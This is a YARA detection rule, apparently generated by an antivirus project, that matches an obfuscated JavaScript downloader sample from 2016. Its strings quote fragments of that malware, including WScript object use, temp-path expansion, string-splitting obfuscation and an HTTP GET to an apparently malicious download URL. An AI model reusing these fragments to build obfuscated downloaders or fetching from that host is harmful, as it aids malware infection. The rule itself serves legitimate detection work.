rule sig_20160428_0f02af64bad4673134fcade89c2f79a1 {
  meta:
    description = "datamaliciousorder - file 20160428_0f02af64bad4673134fcade89c2f79a1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "21eae3c8bff2f77524f78212ff218af38280043baa2afb07383b02ec1fff3bc9"

  strings:
    $s1  = "function ZwdJvdOtnDxeEwqBndCxt(WoaHtzZvaIibLwcGtvRqn){GiwMqgPrmFniWayWuyYxt[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function YazLhkGfbTgbEblAuwZjw() {return GiwMqgPrmFniWayWuyYxt[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function ZwdJvdOtnDxeEwqBndCxt(WoaHtzZvaIibLwcGtvRqn){GiwMqgPrmFniWayWuyYxt[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return SxxKowYatCmfZzcYtzIxt - KokEkuKbqTyoGjhFokQng;};" fullword ascii
    $s5  = "function JooVwyNpjPevNxbEvtGld(SxxKowYatCmfZzcYtzIxt, KokEkuKbqTyoGjhFokQng){RyxAnaVwxMxaIdgXvaSfo = RyxAnaVwxMxaIdgXvaSfo * 1; " ascii
    $s6  = "var GiwMqgPrmFniWayWuyYxt = function RjaAzkWatPtvXwjKibZxz() {return KrnWnrGmjVksXcxNajCwu[YktResHnfHmzNufFrvWih](\"WScript\"+\"" ascii
    $s7  = "WjrOhbJodZvgWhmAjsYvi[GnwUurWltCirVrbGpqFrk](\"G\" + \"ET\", \"http://sar-decor.ru/x8skfa\", false);" fullword ascii
    $s8  = "var GiwMqgPrmFniWayWuyYxt = function RjaAzkWatPtvXwjKibZxz() {return KrnWnrGmjVksXcxNajCwu[YktResHnfHmzNufFrvWih](\"WScript\"+\"" ascii
    $s9  = "var KrnWnrGmjVksXcxNajCwu = this[\"WScript\"];" fullword ascii
    $s10 = "function YazLhkGfbTgbEblAuwZjw() {return GiwMqgPrmFniWayWuyYxt[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (WjrOhbJodZvgWhmAjsYvi[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function JooVwyNpjPevNxbEvtGld(SxxKowYatCmfZzcYtzIxt, KokEkuKbqTyoGjhFokQng){RyxAnaVwxMxaIdgXvaSfo = RyxAnaVwxMxaIdgXvaSfo * 1; " ascii
    $s13 = "function XdsInrQueDsyPonMwdXgh(){return WlkHoiRqhXliAhjXlbKpw + \"\";};" fullword ascii
    $s14 = "function AoxZqtYqfYfhGiiVqqFtl() {return ((UwkEucYixFapAspFyqSax == true) && (UwkEucYixFapAspFyqSax == UkkFroZtmNnkFnoKtoEti)) ?" ascii
    $s15 = "function AoxZqtYqfYfhGiiVqqFtl() {return ((UwkEucYixFapAspFyqSax == true) && (UwkEucYixFapAspFyqSax == UkkFroZtmNnkFnoKtoEti)) ?" ascii
    $s16 = "function QysTltMpeHmfPtpGiaMfh(WklOrzRhgGsaNnnBvmOyn) {var FzgCjdEqoMmrYwnPvkEoc = (1, 2, 3, 4, 5, WklOrzRhgGsaNnnBvmOyn); retur" ascii
    $s17 = "function QysTltMpeHmfPtpGiaMfh(WklOrzRhgGsaNnnBvmOyn) {var FzgCjdEqoMmrYwnPvkEoc = (1, 2, 3, 4, 5, WklOrzRhgGsaNnnBvmOyn); retur" ascii
    $s18 = "function RkdQzxAkwQlvRzwYagOzj()" fullword ascii
    $s19 = "var NtbQixKghJsfRacTpmHbd = false;" fullword ascii
    $s20 = "return JooVwyNpjPevNxbEvtGld(1 == 1 ? LocZweOxeXnkEmrXhmZld : 0, 1 == 1 ? GbiLopDxwXkoYhsRwwEtt : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}